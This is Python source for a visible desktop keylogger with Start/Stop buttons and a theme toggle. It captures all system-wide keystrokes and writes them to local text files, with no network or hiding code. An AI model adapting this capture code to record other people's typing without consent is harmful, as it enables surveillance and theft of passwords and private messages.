import customtkinter as ctk
from pynput import keyboard
import datetime
import os
from PIL import Image, ImageTk
import tkinter as tk

class ThemeToggle:
    def __init__(self, main_frame, dark_mode_img_path, light_mode_img_path):
        self.is_dark_mode = True
        self.main_frame = main_frame

        # Load images for the toggle button
        self.moon_img = ImageTk.PhotoImage(Image.open(dark_mode_img_path))
        self.sun_img = ImageTk.PhotoImage(Image.open(light_mode_img_path))

        # Create a label for the toggle button using grid geometry manager
        self.icon_label = tk.Label(main_frame, image=self.moon_img, cursor="hand2")
        self.icon_label.grid(row=0, column=1, pady=10, padx=10, sticky='ne')
        self.icon_label.bind("<Button-1>", self.toggle_mode)

        # Set initial theme colors
        self.set_theme_colors(dark_mode=True)

    def toggle_mode(self, event=None):
        # Toggle between dark and light mode
        if self.is_dark_mode:
            ctk.set_appearance_mode("Light")
            self.icon_label.config(image=self.sun_img)
            self.set_theme_colors(dark_mode=False)
        else:
            ctk.set_appearance_mode("Dark")
            self.icon_label.config(image=self.moon_img)
            self.set_theme_colors(dark_mode=True)
        self.is_dark_mode = not self.is_dark_mode

    def set_theme_colors(self, dark_mode):
        # Set colors for dark or light mode
        fg_color = "#ffffff" if dark_mode else "#000000"
        for widget in self.main_frame.winfo_children():
            if isinstance(widget, ctk.CTkLabel):
                widget.configure(text_color=fg_color)
            elif isinstance(widget, ctk.CTkButton):
                widget.configure(text_color=fg_color)
            elif isinstance(widget, ctk.CTkEntry):
                widget.configure(text_color=fg_color)

class KeyloggerGUI(ctk.CTk):
    def __init__(self):
        super().__init__()

        # Set the title and initial size of the window
        self.title("Keylogger")
        self.geometry("600x400")  # Increase the size of the window

        # Configure the main window grid to center widgets
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)

        # Main frame to hold all widgets, dynamically resizes with the app window
        self.main_frame = ctk.CTkFrame(self, width=580, height=380)
        self.main_frame.grid(row=0, column=0, sticky="nsew", padx=20, pady=20)
        self.main_frame.grid_columnconfigure(0, weight=1)
        self.main_frame.grid_rowconfigure([0, 1, 2, 3, 4], weight=1)

        # Initialize the theme toggle functionality
        self.theme_toggle = ThemeToggle(self.main_frame, "images/moon.png", "images/sun.png")

        # Start button with fixed size
        self.start_button = ctk.CTkButton(
            self.main_frame, text="Start", command=self.start_keylogger, width=100, height=30
        )
        self.start_button.grid(row=1, column=0, pady=10, sticky="n", padx=50)

        # Info label to display where keystrokes are saved
        self.info_label = ctk.CTkLabel(self.main_frame, text="")
        self.info_label.grid(row=2, column=0, pady=10, sticky="n")

        # Stop button with fixed size
        self.stop_button = ctk.CTkButton(self.main_frame, text="Stop", command=self.stop_keylogger, width=100, height=30)
        self.stop_button.grid(row=3, column=0, pady=10, sticky="n", padx=50)

        # Status label to display the current status of the keylogger
        self.status_label = ctk.CTkLabel(self.main_frame, text="Awaiting user keystroke")
        self.status_label.grid(row=4, column=0, pady=10, sticky="n")

        # Initialize variables for keylogger state
        self.listener = None
        self.is_logging = False
        self.start_time = None
        self.log_file_name = None
        self.log_file = None
        self.special_keys_held = set()  # Track held down special keys
        self.caps_lock_active = False
        self.last_key_was_special = False

    def start_keylogger(self):
        # Start the keylogger session
        if self.is_logging:
            return

        self.is_logging = True
        self.start_time = datetime.datetime.now()

        # Create and open a new log file with a unique name
        self.log_file_name = self.get_log_file_name()
        self.log_file = open(self.log_file_name, "w")
        self.log_file.write(f"Session started: {self.start_time}\n")  # Write session start with newline
        self.log_file.flush()  # Ensure the header is written immediately

        # Update UI elements
        self.status_label.configure(text="Detecting keystrokes...")
        self.info_label.configure(text="Keystrokes are saved in keylog.txt", text_color="green")

        # Start listening for keystrokes
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()

    def stop_keylogger(self):
        # Stop the keylogger session
        if not self.is_logging:
            return

        self.is_logging = False
        self.status_label.configure(text="Stopped detecting user keystroke")

        # Stop the listener and close the log file
        if self.listener:
            self.listener.stop()
            self.listener = None

        if self.log_file:
            # Ensure that "Session ended" appears on a new line
            self.log_file.write("\nSession ended: ")
            self.log_file.write(f"{datetime.datetime.now()}\n")
            self.log_file.close()
            self.log_file = None

    def on_press(self, key):
        # Handle key press events
        if self.log_file:
            if hasattr(key, 'char') and key.char is not None:
                # Write character keys directly
                if self.last_key_was_special:
                    self.log_file.write("\n")
                char = key.char
                # Adjust character for caps lock
                if self.caps_lock_active:
                    char = char.upper() if char.islower() else char.lower()
                self.log_file.write(f"{char}")
                self.last_key_was_special = False
            else:
                # Handle special keys
                if key == keyboard.Key.caps_lock:
                    self.caps_lock_active = not self.caps_lock_active
                if key not in self.special_keys_held:
                    self.special_keys_held.add(key)
                    key_str = str(key).replace('Key.cmd', 'Key.windows_key')
                    if key_str.startswith('Key'):
                        self.log_file.write(f"\n{key_str}")
                    else:
                        self.log_file.write(f"{key_str}")
                self.last_key_was_special = True
            self.log_file.flush()  # Ensure each keystroke is written immediately

    def on_release(self, key):
        # Handle key release events
        if key in self.special_keys_held:
            self.special_keys_held.remove(key)

    def get_log_file_name(self):
        # Generate a unique log file name
        i = 0
        while os.path.exists(f"keylog{i}.txt"):
            i += 1
        return f"keylog{i}.txt"

if __name__ == "__main__":
    # Run the application
    app = KeyloggerGUI()
    app.mainloop()
